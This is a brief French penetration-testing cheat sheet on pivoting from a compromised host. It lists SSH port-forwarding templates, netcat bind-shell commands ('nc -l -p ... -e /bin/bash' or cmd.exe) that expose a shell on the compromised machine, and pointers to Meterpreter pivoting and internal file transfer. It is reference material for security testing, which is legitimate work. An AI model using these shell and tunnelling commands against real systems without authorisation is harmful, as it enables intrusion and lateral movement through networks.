---
description: Pivotage - Cheatsheet
---

# Pivotage

1. <mark style="color:yellow;">Prérequis :</mark>
   * Avoir compromis un système sur le réseau cible (par exemple, un serveur ou un poste de travail).
   * Disposer de privilèges suffisants sur le système compromis pour effectuer des actions supplémentaires.
2. _<mark style="color:yellow;">Utilisation de SSH pour le pivotage (port forwarding)</mark>_ <mark style="color:yellow;"></mark><mark style="color:yellow;">:</mark>
   * `ssh -L <port_local>:<adresse_destination>:<port_destination> <utilisateur>@<hôte>` : Transfert de port local vers le système distant.
3. <mark style="color:yellow;">Utilisation de Netcat pour le pivotage :</mark>
   * Sur la machine compromise :
   * `nc -l -p <port_local> -e cmd.exe` (Windows)
   * `nc -l -p <port_local> -e /bin/bash` (Linux) : Attendre les connexions sur le port local.
   * Sur la machine d'attaque : `nc <hôte_compromis> <port_local>` : Se connecter au port local pour accéder au système distant.
4. <mark style="color:yellow;">Utilisation de Meterpreter pour le pivotage (Metasploit) :</mark>
   * Sur la machine compromise : Utilisez un payload Meterpreter adapté aux privilèges et au système cible (Windows/Linux).
   * Utilisez les commandes Meterpreter pour établir des connexions aux autres machines internes depuis le système compromis.
5. <mark style="color:yellow;">Utilisation de tunnels pour le pivotage :</mark>
   * `ssh -L <port_local>:<adresse_interne>:<port_interne> <utilisateur>@<hôte_intermédiaire>` : Créer un tunnel SSH vers un hôte intermédiaire, puis vers un hôte interne.
6. <mark style="color:yellow;">Transfert de fichiers entre systèmes internes :</mark>
   * Utilisez des commandes telles que scp ou netcat pour transférer des fichiers entre les systèmes internes accessibles depuis la machine compromise.
